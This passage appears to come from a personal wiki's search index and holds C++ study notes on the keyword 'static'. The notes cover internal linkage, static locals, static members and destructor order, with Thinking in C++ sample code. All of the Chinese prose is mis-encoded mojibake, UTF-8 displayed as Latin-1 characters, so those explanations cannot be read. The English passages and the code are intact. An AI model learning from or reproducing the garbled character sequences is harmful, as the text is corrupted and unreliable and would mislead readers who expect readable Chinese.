linkageï¼‰çš„å‡½æ•°ã€‚è¿™æ„å‘³ç€è¿™äº›å‡½æ•°ä»…åœ¨å®šä¹‰å®ƒä»¬çš„ç¿»è¯‘å•å…ƒï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ª.cppæ–‡ä»¶ï¼‰å†…éƒ¨å¯è§ï¼Œè€Œä¸èƒ½è¢«å…¶ä»–ç¿»è¯‘å•å…ƒçœ‹åˆ°æˆ–é“¾æ¥ã€‚è¿™æ ·å¯ä»¥é¿å…ä¸å…¶ä»–ç¿»è¯‘å•å…ƒä¸­å…·æœ‰ç›¸åŒåç§°çš„å‡½æ•°å‘ç”Ÿå‘½åå†²çªã€‚ Static global variablesï¼šæŒ‡çš„æ˜¯åœ¨æ‰€æœ‰å‡½æ•°å¤–é¢å®šä¹‰çš„ã€å…·æœ‰é™æ€é“¾æ¥çš„å…¨å±€å˜é‡ã€‚è¿™ç§å˜é‡ä¹Ÿåªåœ¨å®šä¹‰å®ƒçš„ç¿»è¯‘å•å…ƒå†…éƒ¨å¯è§ï¼Œä»è€Œé¿å…äº†åœ¨ä¸åŒçš„ç¿»è¯‘å•å…ƒä¹‹é—´å…±äº«ã€‚ åºŸå¼ƒï¼ˆdeprecatedï¼‰ è‡ªC++11å¼€å§‹ï¼ŒåŒ¿åå‘½åç©ºé—´ï¼ˆanonymous namespacesï¼‰è¢«æ¨èç”¨äºæ›¿ä»£é™æ€å…¨å±€å˜é‡å’Œé™æ€è‡ªç”±å‡½æ•°ï¼Œå› ä¸ºå®ƒæä¾›äº†æ›´å¥½çš„å°è£…å’Œé˜²æ­¢å‘½åå†²çªçš„æ‰‹æ®µã€‚ åˆ†ææ–¹æ³• ä»å­˜å‚¨ç±»å‹å’Œå¯è§æ€§ä¸¤æ–¹é¢è¿›è¡Œåˆ†æã€‚ç„¶åï¼Œæ³¨æ„é™æ€æˆå‘˜å˜é‡å’Œé™æ€æˆå‘˜å‡½æ•°çš„ä¸€äº›ç‰¹ç‚¹ã€‚æ¯”å¦‚é™æ€æˆå‘˜å˜é‡æ³¨æ„è¦æœ‰definitionï¼Œé™æ€æˆå‘˜å‡½æ•°åªèƒ½è®¿é—®é™æ€æˆå‘˜å˜é‡å’Œè°ƒç”¨é™æ€æˆå‘˜å‡½æ•°ç­‰ã€‚"},{"title":"staticï¼ˆåºŸå¼ƒè‰ç¨¿ï¼‰","path":"/wiki/Thinking_in_C++/staticï¼ˆåºŸå¼ƒè‰ç¨¿ï¼‰.html","content":"In both C and C++ the keyword static has two basic meanings, which unfortunately often step on each otherâ€™s toes: Static storage Allocated once at a fixed address; that is, the object is created in a special static data area rather than on the stack each time a function is called. Visibility of a name Local to a particular translation unit (and local to a class scope in C++). Here, static controls the visibility of a name, so that name cannot be seen outside the translation unit or class. internal linkage:This also describes the concept of linkage, which determines what names the linker will see. æŒä¹…å­˜å‚¨ static å±€éƒ¨å˜é‡å­˜æ”¾åœ¨é™æ€æ•°æ®åŒºï¼ˆstatic data areaï¼‰è€Œä¸åœ¨å‡½æ•°è°ƒç”¨æ—¶çš„å †ä¸­ä¸­åˆ†é…ã€‚å…¶å®ï¼Œstatic å±€éƒ¨å˜é‡å°±æ˜¯å…¨å±€å˜é‡ã€‚ è®¿é—®æ€§çš„é™åˆ¶ å¦‚æœä¸€ä¸ªå…¨å±€å˜é‡/å‡½æ•°æ˜¯staticçš„ï¼Œè¡¨æ˜è¿™ä¸ªå…¨å±€å˜é‡/å‡½æ•°åªåœ¨è¿™ä¸ª.c/.cppæ–‡ä»¶ä¸­æœ‰æ•ˆï¼Œå…¶ä»–æ–‡ä»¶ä¸èƒ½è®¿é—®åˆ°è¿™ä¸ªå…¨å±€å˜é‡/å‡½æ•°ã€‚ æ¦‚å¿µè¡¥å…… å­˜å‚¨ç±»å‹ï¼šå˜é‡å­˜æ”¾åœ¨å“ªï¼Œå…¨å±€åŒºï¼Œå †æ ˆï¼Œå †ç­‰ã€‚ å˜é‡çš„ç”Ÿå‘½å‘¨æœŸï¼šå˜é‡æ‰€åœ¨çš„å†…å­˜ä»åˆ†é…åˆ°é‡Šæ”¾çš„è¿™æ®µæ—¶é—´ã€‚ å˜é‡çš„ä½œç”¨åŸŸï¼šå˜é‡åœ¨æºç ä¸­å¯ä»¥è¢«è®¿é—®åˆ°çš„èŒƒå›´ã€‚ ç±»åˆ« å«ä¹‰ ä¾‹å­ è¿›ç¨‹ä½œç”¨åŸŸ åœ¨æ•´ä¸ªè¿›ç¨‹ä¸­éƒ½è¢«èƒ½è®¿é—®åˆ°ã€‚ å…¨å±€å˜é‡ æ–‡ä»¶ä½œç”¨åŸŸ åœ¨å½“å‰æºç æ–‡ä»¶å†…å¯ä»¥è®¿é—®åˆ° é™æ€å˜é‡ å‡½æ•°ä½œç”¨åŸŸ åœ¨å‡½æ•°å†…å¯ä»¥è®¿é—®åˆ° å±€éƒ¨å˜é‡ å—ä½œç”¨åŸŸ åªèƒ½åœ¨å®šä¹‰å˜é‡çš„&quot;{}&quot;å—å†…è®¿é—® ä½œç”¨åŸŸä¼šå½±å“è¿™ä¸ªåå­—åœ¨linkæ—¶èƒ½ä¸èƒ½è¢«å…¶ä»–translation unitè®¿é—®åˆ°ã€‚å…¨å±€å˜é‡é»˜è®¤æ˜¯external linkageï¼Œæ‰€æœ‰translation unitséƒ½èƒ½è®¿é—®åˆ°ã€‚ Controlling linkage Ordinarily, any name at file scope (that is, not nested inside a class or function) is visible throughout all translation units in a program. This is often called external linkage because at link time the name is visible to the linker everywhere, external to that translation unit. Global variables and ordinary functions have external linkage. å¦‚æœåœ¨objectæˆ–functionå‰åŠ äº†staticï¼Œå°±è¡¨æ˜è¿™ä¸ªobjectæˆ–functionçš„åå­—åªåœ¨å½“å‰çš„translation unitæœ‰æ•ˆï¼Œè¿™ä¸ªnameæ˜¯internal linkageï¼Œå…¶ä»–translation unitæ— æ³•çœ‹è§ä¹Ÿæ— æ³•è®¿é—®åˆ°ã€‚ static elements in C/C++ static variables inside functions å­˜å‚¨æ˜¯å…¨å±€çš„ï¼ŒValue is remembered for entire program ä½œç”¨åŸŸï¼šå‡½æ•°ä½œç”¨åŸŸï¼Œä»…åœ¨å‡½æ•°å†…å¯ä»¥è®¿é—®åˆ° ç”Ÿå‘½å‘¨æœŸï¼š å‡½æ•°é¦–æ¬¡è¢«è°ƒç”¨æ—¶ï¼Œé™æ€æˆå‘˜è¢«åˆå§‹åŒ–ï¼Œåˆå§‹åŒ–åªä¼šå‘ç”Ÿä¸€æ¬¡ ç¨‹åºç»“æŸæ—¶é”€æ¯ Example: num_callså°†åœ¨æ¯æ¬¡å‡½æ•°æ‰§è¡Œæ—¶å€™++ 123456void f()&#123; static int num_calls = 0; //... num_calls++;&#125; // å…¨å±€å˜é‡ï¼Œä½†åªèƒ½åœ¨å‡½æ•°é‡Œè®¿é—® static class objects inside functions å­˜å‚¨æ˜¯å…¨å±€çš„ï¼ŒValue is remembered for entire program ä½œç”¨åŸŸï¼šå‡½æ•°ä½œç”¨åŸŸï¼Œä»…åœ¨å‡½æ•°å†…å¯ä»¥è®¿é—®åˆ° ç”Ÿå‘½å‘¨æœŸï¼š å‡½æ•°é¦–æ¬¡è¢«è°ƒç”¨æ—¶ï¼Œå¯¹è±¡é€šè¿‡æ„é€ å‡½æ•°è¢«åˆå§‹åŒ–ï¼Œåˆå§‹åŒ–åªä¼šå‘ç”Ÿä¸€æ¬¡ ç¨‹åºç»“æŸæ—¶é”€æ¯ï¼Œä¼šè°ƒç”¨ææ„å‡½æ•° æœ¬åœ°å˜é‡æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„ç±»12345678910111213class X&#123;public: X(int, int); ~X(); //...&#125;;void f()&#123; static X my_X(10, 20); //...&#125; Construction occurs when definition is encountered Constructor called at-most once æ„é€ åªå‘ç”Ÿä¸€æ¬¡ï¼Œåœ¨å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨æ—¶å‘ç”Ÿ The constructor arguments must be satisfied Destruction takes place on exit from program ææ„åœ¨ç¨‹åºç»“æŸæ—¶å‘ç”Ÿ Compiler assures LIFO order of destructors æ‰€æœ‰è¢«åˆ›å»ºçš„å¯¹è±¡çš„ææ„å‡½æ•°æŒ‰åˆ›å»ºæ—¶ç›¸åçš„é¡ºåºè¢«è°ƒç”¨ ææ„å‡½æ•°åœ¨exit()è¢«è°ƒç”¨æ—¶æ‰è¢«è°ƒç”¨Destructors for static objects (that is, all objects with static storage, not just local static objects as in the example above) are called when main( ) exits or when the Standard C library function exit( ) is explicitly called. In most implementations, main( ) just calls exit( ) when it terminates. This means that it can be dangerous to call exit( ) inside a destructor because you can end up with infinite recursion. Static object destructors are not called if you exit the program using the Standard C library function abort( ).You can specify actions to take place when leaving main( ) (or calling exit( )) by using the Standard C library function atexit( ). In this case, the functions registered by atexit( ) may be called before the destructors for any objects constructed before leaving main( ) (or calling exit( )). 12345678910111213141516171819202122232425262728293031323334//: C10:StaticDestructors.cpp// Static object destructors#include &lt;fstream&gt;using namespace std;ofstream out(&quot;statdest.out&quot;); // Trace fileclass Obj &#123; char c; // Identifierpublic: Obj(char cc) : c(cc) &#123; out &lt;&lt; &quot;Obj::Obj() for &quot; &lt;&lt; c &lt;&lt; endl; &#125; ~Obj() &#123; out &lt;&lt; &quot;Obj::~Obj() for &quot; &lt;&lt; c &lt;&lt; endl; &#125;&#125;;Obj a(&#x27;a&#x27;); // Global (static storage)// Constructor &amp; destructor always calledvoid f() &#123; static Obj b(&#x27;b&#x27;);&#125;void g() &#123; static Obj c(&#x27;c&#x27;);&#125;int main() &#123; out &lt;&lt; &quot;inside main()&quot; &lt;&lt; endl; f(); // Calls static constructor for b // g() not called out &lt;&lt; &quot;leaving main()&quot; &lt;&lt; endl;&#125; ///:~ è¿è¡Œè¾“å‡º123456Obj::Obj() for ainside main()Obj::Obj() for bleaving main()Obj::~Obj() for bObj::~Obj() for a The constructor for a is called before main( ) is entered, and the constructor for b is called only because f( ) is called. When main( ) exits, the destructors for the objects that have been constructed are called in reverse order of their construction. This means that if g( ) is called, the order in which the destructors for b and c are called depends on whether f( ) or g( ) is called first. Confusion æ­£å› ä¸ºstaticå…³é”®å­—å¯ä»¥è¡¨ç¤ºä¸¤ç§å«ä¹‰ï¼ˆå­˜å‚¨ç±»å‹å’Œå¯è§æ€§ï¼‰ï¼Œæ‰€ä»¥æœ‰æ—¶ä¼šé€ æˆç†è§£ä¸Šçš„å›°æ‰°ï¼Œç°åœ¨æˆ‘ä»¬å±•ç¤ºä¸‹how the two meanings of static can cross over each other. å¯¹äºå…¨å±€å˜é‡ï¼Œstaticæ”¹å˜çš„æ˜¯å¯è§æ€§ All global objects implicitly have static storage class 1int a = 0; å­˜å‚¨ç±»å‹ï¼šå˜é‡aå°†å­˜æ”¾åœ¨static data areaï¼Œå˜é‡açš„åˆå§‹åŒ–åœ¨è¿›å…¥main()å‰å®Œæˆ å¯è§æ€§ï¼šå˜é‡aåœ¨all translation unitséƒ½æ˜¯å¯è§çš„ï¼ˆvisibilityï¼‰ ä»…ä»visibilityä¸Šå¯¹æ¯”ï¼Œextrenè¡¨ç¤ºè¿™ä¸ªåå­—å¯¹æ‰€æœ‰translation unitséƒ½å¯è§ï¼Œæ˜¯staticçš„oppositeï¼ˆvisible only in this translation unitï¼‰ æ‰€ä»¥ä¸Šé¢definitionçš„ç­‰ä»·å†™æ³•å¦‚ä¸‹ï¼š 1extern int a = 0; ä½†å¦‚æœæ˜¯ 1static int a = 0; å­˜å‚¨ç±»å‹ï¼šstaticåœ¨è¿™é‡Œä¸ä¼šä¿®æ”¹åˆ°å˜é‡açš„å­˜å‚¨ç±»å‹ï¼ˆè¿˜æ˜¯æ”¾åœ¨static data areaï¼‰ å¯è§æ€§ï¼šä¿®æ”¹çš„æ˜¯å¯è§æ€§ï¼Œè¡¨æ˜aè¿™ä¸ªåå­—åªåœ¨å½“å‰æ–‡ä»¶å¯è§ å¯¹äºå±€éƒ¨å˜é‡ï¼Œstaticæ”¹å˜çš„æ˜¯å­˜å‚¨ç±»å‹ å­˜å‚¨ç±»å‹ï¼šå˜ä¸ºæŒä¹…å­˜å‚¨ï¼Œæ”¾åœ¨static data area å¯è§æ€§ï¼šä¸ä¼šæ”¹å˜ã€‚è¿™æ—¶åŠ ä¸Šexternæ˜¯æ²¡æ„ä¹‰çš„ è¿™æ—¶åŠ ä¸Šexternæ˜¯è¡¨æ˜è¿™ä¸ªå˜é‡çš„the storage exists elsewhere 12345678910111213//: C10:LocalExtern.cpp//&#123;L&#125; LocalExtern2#include &lt;iostream&gt;int main()&#123; extern int i; std::cout &lt;&lt; i;&#125; ///:~//: C10:LocalExtern2.cpp &#123;O&#125;int i = 5;///:~ å¯¹äºå‡½æ•°åï¼ˆéæˆå‘˜å‡½æ•°ï¼‰ï¼Œstaticæ”¹å˜çš„æ˜¯å¯è§æ€§ å¯¹äºéæˆå‘˜å‡½æ•°ï¼Œstaticå’Œexternåªä¼šæ”¹å˜å¯è§æ€§ï¼Œå‡½æ•°åœ°å€éƒ½æ˜¯å…¨å±€çš„ 12345// external linkagevoid f();// ç­‰ä»·å†™æ³•extern void f(); åŠ staticå°±è¡¨æ˜å‡½æ•°f()åªåœ¨å½“å‰æ–‡ä»¶å¯è§ï¼Œæœ‰æ—¶ç§°ä½œæ–‡ä»¶é™æ€ï¼ˆfile staticï¼‰ 1static void f(); Example g_globalï¼š File1ä¸­çš„g_globalæ˜¯ä¸ªå…¨å±€å˜é‡ï¼Œå¯¹æ‰€æœ‰translation unitså¯è§ï¼Œæ‰€ä»¥åœ¨File12ä¸­å¯ä»¥ç”¨extern int g_globalæ¥è¡¨æ˜g_globalå®šä¹‰åœ¨åˆ«å¤„ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨g_global1äº†ã€‚ s_localï¼š staticï¼Œåªå¯¹å½“å‰æ–‡ä»¶å¯è§ã€‚å³ä½¿File2ä¸­ç”¨extern int s_localè¡¨æ˜s_localå®šä¹‰åœ¨åˆ«å¤„ï¼Œç¼–è¯‘èƒ½è¿‡ï¼Œä½†linkæ—¶è¿‡ä¸å»ï¼ˆFile1è¯´s_localåªç»™è‡ªå·±è¿™ä¸ªæ–‡ä»¶ç”¨ï¼‰ hiddenï¼š staticï¼Œå‡½æ•°ååªå¯¹å½“å‰æ–‡ä»¶å¯è§ï¼ŒFile2ä¸å¯è§ï¼Œä¸å¯ä½¿ç”¨ æ€è€ƒ æ¢ä¸ªè§’åº¦å…¶å®å¯ä»¥ç†è§£ï¼ŒåŠ ä¸Šstaticåï¼Œæ— æ³•åŒæ—¶å°†ä¸¤ä¸ªå«ä¹‰éƒ½ä¿®æ”¹ï¼ŒåŠ ä¸Šstaticåå˜çš„åªæœ‰ä¸€ä¸ªå«ä¹‰ã€‚æ¯”å¦‚ å…¨å±€å˜é‡ï¼Œæœ¬èº«å°±æ˜¯å…¨å±€å­˜å‚¨ï¼ŒåŠ äº†staticè¿˜æ˜¯å…¨å±€å­˜å‚¨ï¼Œæ‰€ä»¥åŠ staticå°±æ˜¯é™åˆ¶å¯è§æ€§ å±€éƒ¨å˜é‡ï¼Œæœ¬èº«å¯è§æ€§æ˜¯åœ¨å—ä½œç”¨åŸŸï¼ŒåŠ äº†staticå¯è§æ€§è¿˜æ˜¯åœ¨å—ä½œç”¨åŸŸé‡Œï¼Œæ‰€ä»¥åŠ staticå°±æ˜¯ä¿®æ”¹ä¸ºæŒä¹…å­˜å‚¨ å‡½æ•°ï¼ˆéæˆå‘˜ï¼‰ï¼Œå‡½æ•°åœ°å€æœ¬èº«å°±æ˜¯å…¨å±€åœ°å€ï¼ŒåŠ äº†staticè¿˜æ˜¯å…¨å±€ï¼Œæ‰€ä»¥åŠ staticå°±æ˜¯é™åˆ¶å¯è§æ€§ å½“ç„¶ï¼Œå¿˜äº†çš„è¯ï¼Œä»å­˜å‚¨ç±»å‹å’Œå¯è§æ€§è¿›è¡Œåˆ†æå³å¯ï¼Œä¸ç”¨æƒ³æ˜¯è¿™ä¸ªæ²¡å˜ï¼Œæ‰€ä»¥å¦å¤–ä¸€ä¸ªå˜äº†ã€‚ Static initialization dependency æœ‰å¤šä¸ªæ–‡ä»¶éƒ½æœ‰ä½œç”¨åŸŸä¸ºå¤šä¸ªtranslation unitsçš„é™æ€å¯¹è±¡ï¼Œè¿™äº›é™æ€å¯¹è±¡ä¹‹é—´äº’æœ‰ä¾èµ–ï¼Œå¦‚ ä¸€ä¸ªæ–‡ä»¶12extern int y;int x = y + 1; å¦ä¸€ä¸ªæ–‡ä»¶12extern int x;int y = x + 1; è°å…ˆåˆå§‹åŒ–è°ååˆå§‹åŒ–çš„é¡ºåºæ˜¯ä¸ç¡®å®šçš„ è§£å†³åŠæ³•ï¼š ä¸ä½¿ç”¨ï¼Œé¿å…é™æ€å¯¹è±¡ä¹‹é—´åˆå§‹åŒ–çš„ä¾èµ– å°†æ‰€æœ‰æœ‰ä¾èµ–çš„è¿™äº›é™æ€å¯¹è±¡æ”¾åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶ä¸­çš„é¡ºåºå°±æ˜¯åˆå§‹åŒ–çš„é¡ºåº ä¸¤ç§åŠæ³• 10: Name ControlWhat to doæ ‡é¢˜ Static members in C++ ä»è®¾è®¡å±‚é¢ä¸Šæ¥çœ‹ï¼š åœ¨Cä¸­ï¼Œstaticæ„å‘³ç€Hiddenå’ŒPersistentï¼Œè€Œåœ¨C++ ä¸­å¤šäº†å¯¹è±¡çš„æ¦‚å¿µï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹Hiddenå’ŒPersistentçš„æ¦‚å¿µåœ¨C++ä¸­æ˜¯å¦‚ä½•å»¶ç»­çš„ï¼š Hiddenï¼Œå®ç°æ•°æ®éšè— åœ¨Cä¸­ï¼Œæˆ‘ä»¬é€šè¿‡staticæ¥ä¿®æ”¹ä¸€ä¸ªå˜é‡/å‡½æ•°çš„å¯è§æ€§ï¼Œè¾¾åˆ°Hiddençš„ç›®çš„ã€‚ä½†åœ¨C++ä¸­ï¼Œæˆ‘ä»¬æœ‰access rules(è®¿é—®æ§åˆ¶ç¬¦ï¼Œpublicï¼Œprotectedï¼Œprivateï¼‰æ¥åšHiddençš„äº‹ã€‚äºæ˜¯ï¼Œå¯¹ä¸€ä¸ªstaticçš„æˆå‘˜å˜é‡æ¥è¯´ï¼Œstaticç”¨æ¥å®ç°Hiddençš„ä»»åŠ¡ç»“æŸäº†ã€‚ Persistentï¼ŒæŒä¹… åŒä¸€ä¸ªå‡½æ•°å¤šæ¬¡è°ƒç”¨å´ä»å­˜åœ¨çš„ä¸œè¥¿ï¼Œpersistentã€‚Cè¯­è¨€ä¸­æœ‰ä¸¤ç§ä¸œè¥¿æ˜¯persistentçš„ï¼Œå…¨å±€å˜é‡å’Œmallocçš„ä¸œè¥¿ï¼ˆmallocçš„åœ¨æ•´ä¸ªç¨‹åºçš„è¿è¡Œå‘¨æœŸéƒ½å­˜åœ¨ï¼‰ åœ¨C++ï¼Œå¯¹è±¡instancesä¹‹é—´å…±äº«çš„ä¸œè¥¿ï¼Œä¸éšç€å¯¹è±¡çš„ä¸åŒè€Œä¸åŒã€‚æ‰€ä»¥è¯´staticæˆå‘˜å˜é‡æ˜¯class-wideï¼ˆç±»çº§åˆ«ï¼‰ä¸Šçš„ä¸œè¥¿ã€‚ æœ‰æ—¶æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåœ¨æ‰€æœ‰ç±»ä¸­éƒ½å…±äº«çš„å˜é‡ï¼Œåœ¨Cä¸­å¯ä»¥ç”¨å…¨å±€å˜é‡å®ç°ï¼Œä½†å…¨å±€å˜é‡æ²¡æœ‰éšè—åœ¨ç±»çš„å†…éƒ¨ã€‚å¦‚æœæ—¢èƒ½è®©æ‰€æœ‰ç±»çš„å¯¹è±¡éƒ½å…±äº«ï¼Œå¹¶ä¸”èƒ½æ”¾åœ¨ç±»é‡Œï¼Œé‚£å°±å†ç†æƒ³ä¸è¿‡äº†ã€‚staticæ•°æ®æˆå‘˜å°±æ˜¯è¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ³•ã€‚ Static members static memberä¹Ÿæ˜¯ç±»çš„æˆå‘˜ï¼Œç±»å¤–å¯¹é™æ€æˆå‘˜å˜é‡çš„è®¿é—®éœ€è¦éµå®ˆaccess rules(è®¿é—®æ§åˆ¶ç¬¦ï¼Œpublicï¼Œprotectedï¼Œprivateï¼‰ é™æ€æˆå‘˜å˜é‡å­˜å‚¨åœ¨å…¨å±€åŒºï¼Œä¸”å¿…é¡»åœ¨ä¸€ä¸ªåœ°æ–¹å®šä¹‰ï¼ˆdefinitionï¼‰ ç±»ä¸­çš„æ˜¯declarationï¼Œdeclarationå¹¶æ²¡åˆ†ç©ºé—´ã€‚å¿…é¡»æœ‰ä¸€ä¸ªåœ°æ–¹å†™ä¸Šdefinitionï¼Œç¼–è¯‘å™¨æ‰ä¼šç»™é™æ€æˆå‘˜å˜é‡åˆ†ç©ºé—´ã€‚é€šå¸¸æ˜¯.hæ”¾ç±»çš„declarationï¼Œåœ¨.cppä¸­å†™definition .h12345678class A&#123;private: static int i;public: //...&#125;; æ­£ç¡®çš„å†™æ³•.cpp12// definitionint A::i; // ok,ç¼–è¯‘å™¨ä¼šé»˜è®¤åˆå§‹åŒ–ä¸º0.cpp12// definitionint A::i = 20; // ok,ç¼–è¯‘å™¨ä¼šåˆå§‹åŒ–ä¸º20é”™è¯¯çš„å†™æ³•ä»è®¾è®¡ä¸Šæ¥è®²ï¼Œstaticé™åˆ¶A::iåªåœ¨å½“å‰æ–‡ä»¶å¯è§ï¼Œä½†A::iå·²ç»åœ¨ç±»Aä¸­æ˜¯privateï¼Œprivateæ˜¯è¯´åªæœ‰ç±»æ‰èƒ½è®¿é—®ï¼Œè¿™ä¼šå†²çªã€‚æ‰€ä»¥definitionè¿™é‡Œå‰é¢ä¸ç”¨å†åŠ ä¸Šstatic.cpp12// definitionstatic int A::i; //error é™æ€æˆå‘˜å˜é‡æ˜¯æ‰€æœ‰å¯¹è±¡instanceså…±äº«çš„ï¼Œæ˜¯å±äºæ•´ä¸ªç±»çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥ï¼š ä¸èƒ½åœ¨æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨ä¸­è¿›è¡Œåˆå§‹åŒ–ï¼Œå› ä¸ºé™æ€æˆå‘˜å˜é‡ä¸æ˜¯å¦æœ‰å¯¹è±¡å®ä¾‹æ— å…³ã€‚åˆå§‹åŒ–åˆ—è¡¨åªèƒ½å¯¹éé™æ€æˆå‘˜å˜é‡è¿›è¡Œåˆå§‹åŒ– å¯ä»¥åœ¨æ„é€ å‡½æ•°çš„å‡½æ•°ä½“ä¸­è¿›è¡Œèµ‹å€¼ï¼Œå› ä¸ºé™æ€æˆå‘˜å˜é‡ä¹Ÿæ˜¯ç±»çš„æˆå‘˜ï¼Œç±»ä¸­çš„å‡½æ•°å¯ä»¥è®¿é—®åˆ°ã€‚å¯¹è±¡ä¹Ÿå¯ä»¥é€šè¿‡thisæŒ‡é’ˆè®¿é—®åˆ° ä¸¤ç§è®¿é—®æ–¹å¼ 123456789101112131415class A&#123;public: //publicï¼Œæ‰€ä»¥mainä¸­å¯ä»¥ç›´æ¥è®¿é—®åˆ°i static int i; //å¦‚æœprivateçš„ï¼Œmainä¸­çš„ä¸¤è¡Œä¹Ÿè®¿é—®ä¸åˆ°&#125;;int A::i = 10;int main()&#123; A a; int r1 = A::i; //æ–¹å¼ä¸€ï¼šç±»å::é™æ€æ•°æ®æˆå‘˜ int r2 = a.i; //æ–¹å¼äºŒï¼šç±»å¯¹è±¡å é™æ€æ•°æ®æˆå‘˜&#125; Static member function static member functionä¹Ÿæ˜¯ç±»çš„æˆå‘˜ï¼Œç±»å¤–å¯¹é™æ€æˆå‘˜å˜é‡çš„è®¿é—®éœ€è¦éµå®ˆaccess rules(è®¿é—®æ§åˆ¶ç¬¦ï¼Œpublicï¼Œprotectedï¼Œprivateï¼‰ å‡ºç°åœ¨ç±»å¤–çš„å‡½æ•°å®šä¹‰ï¼ˆdefinitionï¼‰ä¸ç”¨å†å†™å…³é”®å­—static é™æ€æˆå‘˜å‡½æ•°åªèƒ½è®¿é—®é™æ€æˆå‘˜å˜é‡å’Œå…¶ä»–é™æ€æˆå‘˜å‡½æ•° å› ä¸ºï¼Œé™æ€æˆå‘˜å‡½æ•°ä¸æ˜¯å¦æœ‰å¯¹è±¡å®ä¾‹æ— å…³ï¼Œé‚£ä¹Ÿå°±æ²¡æœ‰thisæŒ‡é’ˆ(thisæŒ‡é’ˆæŒ‡å‘å½“å‰è°ƒç”¨æˆå‘˜å‡½æ•°çš„å¯¹è±¡)ï¼Œæ²¡æœ‰thisæŒ‡é’ˆï¼Œä¹Ÿå°±è®¿é—®ä¸åˆ°éé™æ€æˆå‘˜ï¼Œä¹Ÿä¸èƒ½è°ƒç”¨éé™æ€çš„æˆå‘˜å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738//: C10:StaticMemberFunctions.cppclass X &#123;private: int i; static int j;public: X(int ii = 0) : i(ii) &#123; // Non-static member function can access static member function or data: j = i; &#125; int val() const &#123; return i; &#125; static int incr() &#123; //! i++; // Error: static member functioncannot access non-static member data return ++j; &#125; static int f() &#123; //! val(); // Error: static member function cannot access non-static member function return incr(); // OK -- calls static &#125;&#125;;int X::j = 0;int main() &#123; X x; X* xp = &amp;x; x.f(); xp-&gt;f(); X::f(); // Only works with static members&#125; ///:~ è°ƒç”¨é™æ€æˆå‘˜å‡½æ•°çš„ä¸¤ç§æ–¹å¼ 1234567891011121314151617//: C10:SimpleStaticMemberFunction.cpp class X &#123;public: static void f()&#123;&#125;;&#125;;int main() &#123; //æ–¹å¼ä¸€ X::f(); //æ–¹å¼äºŒ X x; x.f();&#125; However, itâ€™s more typical to call a static member function by itself, without any specific object, using the scope-resolution operator é™æ€æˆå‘˜å‡½æ•°æä¾›äº†ä¸€ç§æ–¹æ³•ï¼šåœ¨ä¸€ä¸ªç±»æ²¡æœ‰åˆ›å»ºä»»ä½•å¯¹è±¡ä¹‹å‰æ¥è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ï¼›æœ‰è¿™ä¹ˆä¸€ä¸ªä¸œè¥¿ï¼Œä¸æ˜¯å¦å­˜åœ¨ç±»çš„å¯¹è±¡æ— å…³çš„ é™æ€æˆå‘˜å˜é‡åŒç†ï¼šåœ¨ä¸€ä¸ªç±»æ²¡æœ‰åˆ›å»ºä»»ä½•å¯¹è±¡ç¤ºä¾‹ä¹‹å‰ï¼Œå°±èƒ½è®©å…¶ä»–äººæ¥è®¿é—®ç±»ä¸­çš„æ•°æ® æ€»ç»“ å°ç»“ Uses of \"static\" in C++ Static free functions Internal Linkage (deprecated) Static global variables Internal Linkage (deprecated) Static local variables Persistent storage Static member variables Shared by all instances Static member function Shared by all instances, can only access static member variables Static free functionsï¼šæŒ‡çš„æ˜¯åœ¨ç±»å¤–å®šä¹‰çš„ã€å…·æœ‰é™æ€é“¾æ¥ï¼ˆinternal linkageï¼‰çš„å‡½æ•°ã€‚è¿™æ„å‘³ç€è¿™äº›å‡½æ•°ä»…åœ¨å®šä¹‰å®ƒä»¬çš„ç¿»è¯‘å•å…ƒï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ª.cppæ–‡ä»¶ï¼‰å†…éƒ¨å¯è§ï¼Œè€Œä¸èƒ½è¢«å…¶ä»–ç¿»è¯‘å•å…ƒçœ‹åˆ°æˆ–é“¾æ¥ã€‚è¿™æ ·å¯ä»¥é¿å…ä¸å…¶ä»–ç¿»è¯‘å•å…ƒä¸­å…·æœ‰ç›¸åŒåç§°çš„å‡½æ•°å‘ç”Ÿå‘½åå†²çªã€‚ Static global variablesï¼šæŒ‡çš„æ˜¯åœ¨æ‰€æœ‰å‡½æ•°å¤–é¢å®šä¹‰çš„ã€å…·æœ‰é™æ€é“¾æ¥çš„å…¨å±€å˜é‡ã€‚è¿™ç§å˜é‡ä¹Ÿåªåœ¨å®šä¹‰å®ƒçš„ç¿»è¯‘å•å…ƒå†…éƒ¨å¯è§ï¼Œä»è€Œé¿å…äº†åœ¨ä¸åŒçš„ç¿»è¯‘å•å…ƒä¹‹é—´å…±äº«ã€‚ åºŸå¼ƒï¼ˆdeprecatedï¼‰ è‡ªC++11å¼€å§‹ï¼ŒåŒ¿åå‘½åç©ºé—´ï¼ˆanonymous namespacesï¼‰è¢«æ¨èç”¨äºæ›¿ä»£é™æ€å…¨å±€å˜é‡å’Œé™æ€è‡ªç”±å‡½æ•°ï¼Œå› ä¸ºå®ƒæä¾›äº†æ›´å¥½çš„å°è£…å’Œé˜²æ­¢å‘½åå†²çªçš„æ‰‹æ®µã€‚ åˆ†ææ–¹æ³• ä»å­˜å‚¨ç±»å‹å’Œå¯è§æ€§ä¸¤æ–¹é¢è¿›è¡Œåˆ†æã€‚ç„¶åï¼Œæ³¨æ„é™æ€æˆå‘˜å˜é‡å’Œé™æ€æˆå‘˜å‡½æ•°çš„ä¸€äº›ç‰¹ç‚¹ã€‚æ¯”å¦‚é™æ€æˆå‘˜å˜é‡æ³¨æ„è¦æœ‰definitionï¼Œé™æ€æˆå‘˜å‡½æ•°åªèƒ½è®¿é—®é™æ€æˆå‘˜å˜é‡å’Œè°ƒç”¨é™æ€æˆå‘˜å‡½æ•°ç­‰ã€‚ å…¨å±€å˜é‡ï¼ˆåŸºæœ¬ç±»å‹ï¼Œä¸å«å¯¹è±¡ï¼‰ éstatic static å­˜å‚¨ä½ç½® 